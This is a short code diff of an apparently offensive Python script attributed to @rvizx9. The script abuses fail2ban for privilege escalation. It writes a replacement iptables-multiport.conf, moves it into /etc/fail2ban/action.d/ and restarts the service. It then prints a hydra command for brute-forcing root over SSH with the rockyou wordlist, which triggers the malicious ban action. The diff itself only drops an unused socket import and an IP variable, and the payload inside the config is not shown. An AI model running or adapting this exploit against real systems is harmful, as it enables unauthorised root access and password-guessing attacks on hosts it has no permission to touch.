@@ -4,7 +4,6 @@
 # author : Ravindu Wickramasinghe (@rvizx9)
 
 import os
-import socket
 from time import sleep as s
 
 print('''
@@ -39,7 +38,6 @@ with open("iptables-multiport.conf","w") as f:
 
 os.system("mv iptables-multiport.conf /etc/fail2ban/action.d/")
 os.system("sudo /etc/init.d/fail2ban restart")
-ip=socket.gethostbyname(socket.gethostname())
 os.system("ip -br -c a")
 
 print("[!] start to bruteforce ssh login. \n[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh")
